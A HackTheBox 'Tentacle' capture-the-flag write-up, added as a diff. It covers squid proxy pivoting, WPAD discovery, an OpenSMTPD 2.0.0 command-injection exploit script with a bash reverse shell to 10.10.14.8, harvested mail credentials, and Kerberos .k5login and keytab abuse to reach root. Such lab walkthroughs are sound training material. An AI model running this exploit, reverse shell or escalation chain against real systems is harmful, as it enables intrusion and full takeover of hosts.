@@ -1,0 +1,821 @@
+---
+layout: menu
+title: "HTB Tentacle"
+description: "10.10.10.224 | 40 pts"
+header-img: "boxes/screenshots/49_unbalanced/unbalanced.png"
+tags: [hackthebox, htb, boot2root, writeup, linux, tentacle, squid, squid proxy, proxychains, wpad, web proxy auto-discovery, web proxy auto discovery, web proxy autodiscovery, wpad.dat, kerberos, kinit, klist, kadmin, ksu, kerberos principal, principals, user principal, service principal, keytab, k5login, rsync]
+---
+
+:filesdir: /boxes/files/63_tentacle/
+:imagesdir: /boxes/screenshots/63_tentacle/
+:page-liquid:
+:source-highlighter: rouge
+
++++<h1 style="color:red">+++ HTB Tentacle (10.10.10.224) +++</h1>+++
+
+---
+
+:toc: 
+:toc-title: TABLE OF CONTENTS
+
+---
+
+== PART 1 : INITIAL RECON
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ nmap --min-rate 3000 -oN nmap-tcp.initial -p- -Pn -T4 -v 10.10.10.224
+  
+  PORT     STATE SERVICE
+  22/tcp   open  ssh
+  53/tcp   open  domain
+  88/tcp   open  kerberos-sec
+  3128/tcp open  squid-http
+
+$ nmap -oN nmap-tcp -p 22,53,88,3128 -Pn -sC -sV -v 10.10.10.224
+
+  PORT     STATE SERVICE      VERSION
+  22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
+  | ssh-hostkey: 
+  |   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
+  |   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
+  |_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
+  53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
+  | dns-nsid: 
+  |_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
+  88/tcp   open  kerberos-sec MIT Kerberos (server time: 2021-04-05 12:07:18Z)
+  3128/tcp open  http-proxy   Squid http proxy 4.11
+  |_http-server-header: squid/4.11
+  |_http-title: ERROR: The requested URL could not be retrieved
+  Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
+
+----
+____
+
+---
+
+== PART 2 : PORT ENUMERATION
+
+=== TCP PORT 3128 : SQUID PROXY
+____
+image::3128_landing_page.png[REALCORP.HTB]
+____
+
+The cache administrator seems to be `*j.nakazawa@realcorp.htb*`  and the response page seems to have been generated from `*srv01.realcorp.htb*`. The following line could now be added to the `*/etc/hosts*` file: 
+____
+[source,shell,subs="verbatim,quotes"]
+----
+10.10.10.224    realcorp.htb srv01.realcorp.htb
+----
+____
+
+=== TCP PORT 53 : DNS
+
+Checking for interesting entries using `*dig*`: 
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ dig realcorp.htb @10.10.10.224 ANY 
+
+  ; <<>> DiG 9.16.12-Debian <<>> realcorp.htb @10.10.10.224 ANY
+  ;; global options: +cmd
+  ;; Got answer:
+  ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14447
+  ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2
+
+  ;; OPT PSEUDOSECTION:
+  ; EDNS: version: 0, flags:; udp: 4096
+  ; COOKIE: 1a6b321e3284ed2a9f10df79606b26827e20fd87e56d7383 (good)
+  ;; QUESTION SECTION:
+  ;realcorp.htb.			IN	ANY
+
+  ;; ANSWER SECTION:
+  realcorp.htb.		259200	IN	SOA	realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400
+  realcorp.htb.		259200	IN	NS	ns.realcorp.htb.
+
+  ;; ADDITIONAL SECTION:
+  ns.realcorp.htb.	259200	IN	A	10.197.243.77
+
+  ;; Query time: 171 msec
+  ;; SERVER: 10.10.10.224#53(10.10.10.224)
+  ;; WHEN: Mon Apr 05 11:02:26 EDT 2021
+  ;; MSG SIZE  rcvd: 143
+  
+----
+____
+
+Now to look for interesting subdomains:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ for i in $(cat ~/shares/security/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt); do (nslookup -type=any $i.realcorp.htb 10.10.10.224 | grep -i name); done
+
+  Name:	ns.realcorp.htb
+  proxy.realcorp.htb	canonical name = ns.realcorp.htb.
+  Name:	wpad.realcorp.htb
+
+$ nslookup proxy.realcorp.htb 10.10.10.224
+
+  Server:		10.10.10.224
+  Address:	10.10.10.224#53
+
+  proxy.realcorp.htb	canonical name = ns.realcorp.htb.
+  Name:	ns.realcorp.htb
+  Address: 10.197.243.77
+
+$ nslookup wpad.realcorp.htb 10.10.10.224
+
+  Server:		10.10.10.224
+  Address:	10.10.10.224#53
+
+  Name:	wpad.realcorp.htb
+  Address: 10.197.243.31
+
+----
+____
+
+There were two subdomains found, `*proxy.realcorp.htb*` and `*wpad.realcorp.htb*`, but the IPs associated with them seems to be internal and is currently inaccessible from the local machine.
+
+=== TCP PORT 22 : SSH
+
+Trying to fail the password prompt three times will show what authentication methods are available:
+____
+[source,console,subs="verbatim,quotes"]
+----
+$ ssh -l j.nakazama 10.10.10.224
+
+  j.nakazama@10.10.10.224's password: 
+  Permission denied, please try again.
+  j.nakazama@10.10.10.224's password: 
+  Permission denied, please try again.
+  j.nakazama@10.10.10.224's password: 
+  j.nakazama@10.10.10.224: Permission denied (gssapi-keyex,gssapi-with-mic,password).
+----
+____
+
+In this case the allowed authentication methods are -- `*gssapi-keyex*`, `*gssapi-with-mic*`, `*password*`
+
+GSSAPI Authentication seems to be supported on the machine and it is usually used with Kerberos. Knowing that there is an open TCP port 88 (Kerberos), this might be the way to authenticate into the machine.
+
+=== TCP PORT 88 : KERBEROS
+
+Setting up the *kerberos* configuration `*/etc/krb5.conf*`: 
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ sudo mv /etc/krb5.conf /etc/krb.conf_
+
+$ sudo vim /etc/krb5.conf
+----
+____
+____
+[source,console,subs="verbatim,quotes"]
+----
+[libdefaults]
+	  default_realm = REALCORP.HTB
+	  dns_lookup_realm = false
+	  dns_lookup_kdc = false
+[realms]
+	  REALCORP.HTB = {
+    		kdc = 10.10.10.224
+  	}
+----
+____
+
+Then trying to run `*kinit*` to generate a *krbtgt* ticket:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ kinit -V j.nakazawa
+
+  Using default cache: /tmp/krb5cc_1000
+  Using principal: j.nakazawa@REALCORP.HTB
+  Password for j.nakazawa@REALCORP.HTB: 
+
+----
+____
+
+Generating a `*krbtgt*` ticket seems possible for the machine however, no user credentials has been found as of yet.
+
+---
+
+== PART 3 : PROXYCHAINS
+
+Adding first the initial proxy found from the nmap scan to `*/etc/proxychains.conf*`
+____
+[source,console,subs="verbatim,quotes"]
+----
+http 10.10.10.224 3128
+----
+____
+
+The previously found IPs using `*nslookup*` were still unaccessible -- *10.197.243.77* (proxy.realcorp.htb) and *10.197.243.31* (wpad.realcorp.htb); however, a hop to localhost is possible:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ proxychains nmap -p 21,22,25,53,80,88,3128 -v 127.0.0.1
+
+  PORT     STATE  SERVICE
+  21/tcp   closed ftp
+  22/tcp   open   ssh
+  25/tcp   closed smtp
+  53/tcp   open   domain
+  80/tcp   closed http
+  88/tcp   open   kerberos-sec
+  3128/tcp open   squid-http
+----
+____
+
+The `*nmap*` scan was done with common ports. Now, adding a hop to localhost to the *proxychains* configuration:
+
+____
+[source,console,subs="verbatim,quotes"]
+----
+http 10.10.10.224 3128
+http 127.0.0.1 3128
+----
+____
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ proxychains nmap -p 21,22,25,53,80,88,3128 -v 10.197.243.77
+
+  PORT     STATE  SERVICE
+  PORT     STATE  SERVICE
+  21/tcp   closed ftp
+  22/tcp   open   ssh
+  25/tcp   closed smtp
+  53/tcp   open   domain
+  80/tcp   closed http
+  88/tcp   open   kerberos-sec
+  3128/tcp open   squid-http
+----
+____
+
+A hop to *10.197.243.77* (proxy.realcorp.htb) is now possible while *10.197.243.31* (wpad.realcorp.htb) is still unaccessible. Since TCP port 3128 is still open for 10.197.243.77, might as well add it to the *proxychains* configuration file.
+
+____
+[source,console,subs="verbatim,quotes"]
+----
+http 10.10.10.224   3128
+http 127.0.0.1      3128
+http 10.197.243.77  3128
+----
+____
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ proxychains nmap -p 21,22,25,53,80,88,3128 -v 10.197.243.77
+
+  PORT     STATE  SERVICE
+  PORT     STATE  SERVICE
+  21/tcp   closed ftp
+  22/tcp   open   ssh
+  25/tcp   closed smtp
+  53/tcp   open   domain
+  80/tcp   open   http
+  88/tcp   open   kerberos-sec
+  3128/tcp open   squid-http
+----
+____
+
+This time, while *10.197.243.31* (wpad.realcorp.htb) is now accessible, TCP port 80 is also now open. Port 80 must be where the previously found virtualhost, `*wpad.realcorp.htb*`, was hosted. Adding the following line to the `*/etc/hosts*` file then trying to access the open http service:
+
+____
+[source,console,subs="verbatim,quotes"]
+----
+10.10.10.224    srv01.realcorp.htb realcorp.htb
+10.197.243.31   wpad.realcorp.htb
+----
+____
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ proxychains curl -I http://wpad.realcorp.htb
+
+  HTTP/1.1 403 Forbidden
+  Server: nginx/1.14.1
+  Date: xxx, xx xxx xxxx xx:xx:xx GMT
+  Content-Type: text/html
+  Content-Length: 169
+  Connection: keep-alive
+
+----
+____
+
+The page returns with a 403 (Forbidden) Response Code but, after googling the releveance of _*wpad*_, it leads you to a handful of results about *Web Proxy Auto-Discovery*. What it does is it helps browsers determine which proxy server to connect to by guiding them towards the PAC _*(proxy auto-config) file*_. In this case the PAC file for WPAD is called *wpad.dat*:
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ proxychains curl http://wpad.realcorp.htb/wpad.dat
+
+  function FindProxyForURL(url, host) {
+    if (dnsDomainIs(host, "realcorp.htb"))
+        return "DIRECT";
+    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
+        return "DIRECT"; 
+    ##if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))##
+        return "DIRECT"; 
+ 
+    return "PROXY proxy.realcorp.htb:3128";
+  }
+----
+____
+
+This indicates that from `*proxy.realcorp.htb:3128*`, all connections within the IP ranges specified or from domains with `*realcorp.htb*` are passed through; however, with this, a new set of IPs are found -- *10.241.251.0/24*. And now running an nmap scan for that IP range: 
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ proxychains nmap -oN nmap-tcp_10.241.251.0_24 -p 21,22,25,53,80,88,3128 -v 10.241.251.0/24
+
+$ cat nmap-tcp_10.241.251.0_24| grep -B10 open | grep -E "Nmap|open|PORT"
+
+  Nmap scan report for 10.241.251.1
+  PORT     STATE  SERVICE
+  22/tcp   open   ssh 
+  53/tcp   open   domain
+  88/tcp   open   kerberos-sec
+  3128/tcp open   squid-http
+
+  Nmap scan report for 10.241.251.113
+  PORT     STATE  SERVICE
+  ##25/tcp   open   smtp##
+----
+____
+
+There seems to be open ports in `*10.241.251.1*` the same as the ones found from previous scans but this time, there is an open TCP port 25 (SMTP) on `*10.241.251.113` and doing a service scan using `*nmap*` reveals the following: 
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ proxychains nmap -p 25 -sC -sV -v 10.241.251.113
+
+  PORT   STATE SERVICE VERSION
+  25/tcp open  smtp    OpenSMTPD
+  | smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
+  |_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
+  Service Info: Host: smtp.realcorp.htb
+----
+____
+
+---
+
+== PART 4 : EXPLOITATION
+
+An *OpenSMTPD 2.0.0* service seems to be running on `10.241.251.113` and upon searching for an existing, this came up -- 
+link:https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/[Remote code execution in OpenSMTPD]. A few lines from the exploit were edited since it will not work right out the box:
+
+____
+[source,python,subs="verbatim,quotes"]
+----
+import socket, time
+import sys
+
+#HOST = "10.241.251.113"#
+PORT = 25              # smtp port
+s = None
+###writeto = input("Which file do you want to write to?: ")#raw inputen##
+###writewhat = input("What do you want to write to the file?: ")##
+payload = b"""\r\n
+#0\r\n
+#1\r\n
+#2\r\n
+#3\r\n
+#4\r\n
+#5\r\n
+#6\r\n
+#7\r\n
+#8\r\n
+#9\r\n
+#a\r\n
+#b\r\n 
+#c\r\n
+#d\r\n
+##bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'##
+.
+"""
+for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
+    af, socktype, proto, canonname, sa = res
+    try:
+        s = socket.socket(af, socktype, proto)
+    except OSError as msg:
+        s = None
+        continue
+    try:
+        s.connect(sa)
+    except OSError as msg:
+        s.close()
+        s = None
+        continue
+    break
+if s is None:
+    print('could not open socket')
+    sys.exit(1)
+with s:
+	data = s.recv(1024)
+	print('Received', repr(data))
+	time.sleep(1)
+	print('sending')
+	s.send(b"helo test.com\r\n")
+	data = s.recv(1024)
+	print('Received', repr(data))
+	s.send(b"MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\r\n")
+	time.sleep(1)
+	data = s.recv(1024)
+	print('Received', repr(data))
+	##s.send(b"RCPT TO:<j.nakazawa@realcorp.htb>\r\n")##
+	data = s.recv(1024)
+	print('Received', repr(data))
+	s.send(b"DATA\r\n")
+	data = s.recv(1024)
+	print('Received', repr(data))
+	s.send(payload)
+	data = s.recv(1024)
+	print('Received', repr(data))
+	s.send(b"QUIT\r\n")
+	data = s.recv(1024)
+	print('Received', repr(data))
+print("done")
+s.close()
+----
+____
+
+And upon running the exploit: 
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ proxychains python3 exploit.py
+
+  Received b'220 smtp.realcorp.htb ESMTP OpenSMTPD\r\n'
+  sending
+  Received b'250 smtp.realcorp.htb Hello test.com [10.241.251.1], pleased to meet you\r\n'
+  Received b'250 2.0.0 Ok\r\n'
+  Received b'250 2.1.5 Destination address valid: Recipient ok\r\n'
+  Received b'354 Enter mail, end with "." on a line by itself\r\n'
+  Received b'250 2.0.0 da629965 Message accepted for delivery\r\n'
+  Received b'221 2.0.0 Bye\r\n'
+  done
+----
+____
+
+A reverse shell started via *netcat* listener on port 443 was spawned: 
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ sudo nc -lvp 443
+
+root@smtp:~# id
+
+  uid=0(root) gid=0(root) groups=0(root)
+
+root@smtp:~# hostname
+
+  smtp.realcorp.htb
+----
+____
+
+---
+
+== PART 5 : GENERATING USER SHELL (j.nakazawa)
+
+Enumerating inside the reverse shell established from `*10.241.251.113*`: 
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+root@smtp:/# cat /etc/passwd | grep -E "sh$"
+
+  root:x:0:0:root:/root:/bin/bash
+  j.nakazawa:x:1000:1000::/home/j.nakazawa:/bin/bash
+
+root@smtp:/# cd /home/j.nakazawa  
+
+root@smtp:/home/j.nakazawa# ls -la
+
+  total 16
+  drwxr-xr-x. 1 j.nakazawa j.nakazawa   59 Apr  6 06:18 .
+  drwxr-xr-x. 1 root       root         24 Dec  8 10:56 ..
+  lrwxrwxrwx. 1 root       root          9 Dec  9 12:31 .bash_history -> /dev/null
+  -rw-r--r--. 1 j.nakazawa j.nakazawa  220 Apr 18  2019 .bash_logout
+  -rw-r--r--. 1 j.nakazawa j.nakazawa 3526 Apr 18  2019 .bashrc
+  ##-rw-------. 1 j.nakazawa j.nakazawa  476 Dec  8 19:12 .msmtprc##
+  -rw-r--r--. 1 j.nakazawa j.nakazawa  807 Apr 18  2019 .profile
+  lrwxrwxrwx. 1 root       root          9 Dec  9 12:31 .viminfo -> /dev/null
+
+root@smtp:/home/j.nakazawa# cat .msmtprc
+
+  # Set default values for all following accounts.
+  defaults
+  auth           on
+  tls            on
+  tls_trust_file /etc/ssl/certs/ca-certificates.crt
+  logfile        /dev/null
+
+  # RealCorp Mail
+  account        realcorp
+  host           127.0.0.1
+  port           587
+  from           j.nakazawa@realcorp.htb
+  ##user           j.nakazawa##
+  ##password       sJB}RM>6Z~64_##
+  tls_fingerprint	C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60
+
+  # Set a default account
+  account default : realcorp
+----
+____
+
+Using the credentials found (`*j.nakazawa:sJB}RM>6Z~64_*`) to SSH into *10.10.10.224* fails; however earlier, kerberos is enabled and to generate a *krbtgt* ticket, a password is needed:
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ kinit -V j.nakazawa
+
+  Using default cache: /tmp/krb5cc_1000
+  Using principal: j.nakazawa@REALCORP.HTB
+  Password for j.nakazawa@REALCORP.HTB: sJB}RM>6Z~64_
+  Authenticated to Kerberos v5
+
+$ klist
+
+  Ticket cache: FILE:/tmp/krb5cc_1000
+  Default principal: j.nakazawa@REALCORP.HTB
+
+  Valid starting       Expires              Service principal
+  xx/xx/xxxx xx:xx:xx  xx/xx/xxxx xx:xx:xx  krbtgt/REALCORP.HTB@REALCORP.HTB
+----
+____
+
+The authentication via *kerberos* succeeded and a ticket valid for 24 hours was generated. Using this to login via SSH, the `*/etc/hosts*` needs to be modified to give priority to `*srv01.realcorp.htb*`: 
+
+____
+[source,console,subs="verbatim,quotes"]
+----
+##10.10.10.224    srv01.realcorp.htb realcorp.htb##
+10.197.243.31   wpad.realcorp.htb
+----
+____
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ ssh -l j.nakazawa 10.10.10.224
+
+[j.nakazawa@srv01 ~]$ id
+
+  uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+[j.nakazawa@srv01 ~]$ hostname
+  
+  srv01.realcorp.htb 
+
+[j.nakazawa@srv01 ~]$ ls -l user.txt
+
+  -r--------. 1 j.nakazawa j.nakazawa 33 Apr  6 19:52 user.txt
+----
+____
+
+The reason for this becomes apparent when `*klist*` is run again on the local machine: 
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ klist
+
+  Ticket cache: FILE:/tmp/krb5cc_1000
+  Default principal: j.nakazawa@REALCORP.HTB
+
+  Valid starting       Expires              Service principal
+  xx/xx/xxxx xx:xx:xx  xx/xx/xxxx xx:xx:xx  krbtgt/REALCORP.HTB@REALCORP.HTB
+  xx/xx/xxxx xx:xx:xx  xx/xx/xxxx xx:xx:xx  host/srv01.realcorp.htb@
+  	Ticket server: host/srv01.realcorp.htb@REALCORP.HTB
+----
+____
+
+The machine was using `*srv01.realcorp.htb*` for kerberos authentication and a ticket for the host was acuired during the connection.
+
+---
+
+== PART 6 : CHANGING USER (j.nakazawa -> admin)
+
+Enumerating inside the machine as `*j.nakazawa*`:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+[j.nakazawa@srv01 ~]$ cat /etc/passwd | grep -E "sh$"
+
+  root:x:0:0:root:/root:/bin/bash
+  j.nakazawa:x:1000:1000::/home/j.nakazawa:/bin/bash
+  admin:x:1011:1011::/home/admin:/bin/bash
+
+[j.nakazawa@srv01 ~]$ grep -r -E "root|admin" /etc/cron*
+
+  /etc/cron.d/0hourly:MAILTO=root
+  /etc/cron.d/0hourly:01 * * * * root run-parts /etc/cron.hourly
+  /etc/cron.d/raid-check:0 1 * * Sun root /usr/sbin/raid-check
+  /etc/crontab:MAILTO=root
+  /etc/crontab:##* * * * * admin /usr/local/bin/log_backup.sh##
+----
+____
+
+After looking for other users in the machine, system cronjobs were checked and one was created by the user, `*admin*` -- `*/usr/local/bin/log_backup.sh*`. Upon checking the contents:
+
+____
+[source,sh,subs="verbatim,quotes"]
+----
+#!/bin/bash
+
+/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
+cd /home/admin
+/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
+/usr/bin/rm -f access.log cache.log
+----
+____
+
+This will archive/compress the contents of `*/var/log/squid/*` and copy it to `*/home/admin/*`. It will then compress log files and save it before deleting them.
+
+Now, leveraging the `*rsync*` being run in the cronjob, we need to search if the directories involved are writable:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+[j.nakazawa@srv01 ~]$ id
+
+  uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),##23(squid)##,100(users) 
+  context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+[j.nakazawa@srv01 log]$ find / -gid 23 #-writable# 2>/dev/null
+  
+  #/var/log/squid#
+----
+____
+
+Since, the current user is a member of the `*squid*` group (23), the directory `/var/log/squid/` should be writable.
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+[j.nakazawa@srv01 log]$ echo j.nakazawa@REALCORP.HTB > /var/log/squid/.k5login
+----
+____
+
+The reason for writing a `*.k5login*` file which will then be copied into the `*/home/admin/*` directory is that if you want other users to be able to login to your account using kerberos, you need to add their principal name (in this case, `*j.nakazawa@REALCORP.HTB*`) into a `*.k5login*` in your home directory (`*~/.k5login*`). With this, we should now be able to login with the user, `*admin*`, once the cronjob finishes execution.
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ ssh -l admin 10.10.10.224   
+
+[admin@srv01 ~]$ id
+
+  uid=1011(admin) gid=1011(admin) groups=1011(admin),23(squid) 
+  context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+[admin@srv01 ~]$ hostname
+
+  srv01.realcorp.htb
+----
+____
+
+---
+
+== PART 7 : PRIVILEGE ESCALATION (admin -> root)
+
+Enumerating inside the machine as `*admin*`:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+[admin@srv01 ~]$ id
+
+  #uid=1011(admin)# gid=1011(admin) groups=1011(admin),23(squid) 
+  context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+[admin@srv01 ~]$ find / -gid 1011 #-readable# 2>/dev/null | grep -vE "^.proc|^.run|^.sys"
+
+  #/etc/krb5.keytab#
+  /usr/local/bin/log_backup.sh
+  /home/admin
+  /home/admin/.ssh
+
+[admin@srv01 ~]$ file /etc/krb5.keytab
+  
+  /etc/krb5.keytab: Kerberos Keytab file, realm=REALCORP.HTB, principal=host/srv01.realcorp.htb, type=1, date=Tue Dec  8 22:15:30 2020, kvno=2
+----
+____
+
+Searching for all readable files by the user, `*admin*`, returns a readable keytab file -- `*/etc/krb5.keytab*`. It is where service principal keys are stored and improper permissions or having read access to the file enables an attacker to impersonate service accounts.
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+[admin@srv01 ~]$ klist -k /etc/krb5.keytab
+
+  Keytab name: FILE:/etc/krb5.keytab
+  KVNO Principal
+  ---- --------------------------------------------------------------------------
+     2 host/srv01.realcorp.htb@REALCORP.HTB
+     2 host/srv01.realcorp.htb@REALCORP.HTB
+     2 host/srv01.realcorp.htb@REALCORP.HTB
+     2 host/srv01.realcorp.htb@REALCORP.HTB
+     2 host/srv01.realcorp.htb@REALCORP.HTB
+     2 kadmin/changepw@REALCORP.HTB
+     2 kadmin/changepw@REALCORP.HTB
+     2 kadmin/changepw@REALCORP.HTB
+     2 kadmin/changepw@REALCORP.HTB
+     2 kadmin/changepw@REALCORP.HTB
+     2 kadmin/admin@REALCORP.HTB
+     2 kadmin/admin@REALCORP.HTB
+     2 kadmin/admin@REALCORP.HTB
+     2 kadmin/admin@REALCORP.HTB
+     2 kadmin/admin@REALCORP.HTB
+----
+____
+
+Viewing the contents of the keytab file, there two accounts that could be impersonated using `*kadmin*`-- `kadmin/changepw@REALCORP.HTB` and `*kadmin/admin@REALCORP.HTB*`
+____
+[source,shell,subs="verbatim,quotes"]
+----
+[admin@srv01 ~]$ kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
+
+kadmin: get_privs
+
+  current privileges: INQUIRE ##ADD## MODIFY DELETE
+
+kadmin: add_principal root@REALCORP.HTB
+
+  No policy specified for root@REALCORP.HTB; defaulting to no policy
+  Enter password for principal "root@REALCORP.HTB": ggwp
+  Re-enter password for principal "root@REALCORP.HTB": ggwp
+  Principal "root@REALCORP.HTB" created.
+
+kadmin: exit
+----
+____
+
+It seems like the `*admin*` account has `*ADD*` privileges to *Kerberos* and with that, a user principal, `*root@REALCORP.HTB*`, was successfully created. Now, to gain root access:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+[admin@srv01 ~]$ ksu
+  
+  WARNING: Your password may be exposed if you enter it here and are logged 
+           in remotely using an unsecure (non-encrypted) channel. 
+  Kerberos password for root@REALCORP.HTB: : ggwp
+
+[root@srv01 admin]# id
+
+  uid=0(root) gid=0(root) groups=0(root) 
+  context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c102
+
+[root@srv01 admin]# ls -l /root/root.txt 
+
+  -r--------. 1 root root 33 Apr  7 00:04 /root/root.txt
+
+[root@srv01 admin]# ip addr
+
+  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+      inet 127.0.0.1/8 scope host lo
+         valid_lft forever preferred_lft forever
+      inet6 ::1/128 scope host 
+         valid_lft forever preferred_lft forever
+  2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+      link/ether 00:50:56:b9:d3:48 brd ff:ff:ff:ff:ff:ff
+      inet 10.10.10.224/24 brd 10.10.10.255 scope global noprefixroute ens192
+         valid_lft forever preferred_lft forever
+      inet 10.197.243.77/24 brd 10.197.243.255 scope global noprefixroute ens192:0
+         valid_lft forever preferred_lft forever
+      inet 10.197.243.31/24 brd 10.197.243.255 scope global secondary noprefixroute ens192:1
+         valid_lft forever preferred_lft forever
+      inet6 dead:beef::4627:8a70:2d81:989f/64 scope global dynamic noprefixroute 
+         valid_lft 86368sec preferred_lft 14368sec
+      inet6 fe80::6588:7412:db10:612c/64 scope link noprefixroute 
+         valid_lft forever preferred_lft forever
+  3: cni-podman1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+      link/ether 0e:7e:1c:08:ed:d2 brd ff:ff:ff:ff:ff:ff
+      inet 10.241.251.1/24 brd 10.241.251.255 scope global cni-podman1
+         valid_lft forever preferred_lft forever
+      inet6 fe80::c7e:1cff:fe08:edd2/64 scope link 
+         valid_lft forever preferred_lft forever
+  4: vethbc94cb18@if3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master cni-podman1 state UP group default 
+      link/ether 82:ca:1b:ae:e7:18 brd ff:ff:ff:ff:ff:ff link-netns cni-4a7ef39c-a97e-11a6-433c-4dd8d53bd27b
+      inet6 fe80::80ca:1bff:feae:e718/64 scope link 
+         valid_lft forever preferred_lft forever
+----
+____
+
+---
+
+== PART 8 : REFERENCES
+
+- https://nakedsecurity.sophos.com/2016/05/25/when-domain-names-attack-the-wpad-name-collision-vulnerability/
+- https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/
+- https://www.oreilly.com/library/view/linux-security-cookbook/0596003919/ch04s14.html
+- https://directory.apache.org/apacheds/kerberos-ug/4.1-authenticate-kinit.html
+- https://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch11_04.htm
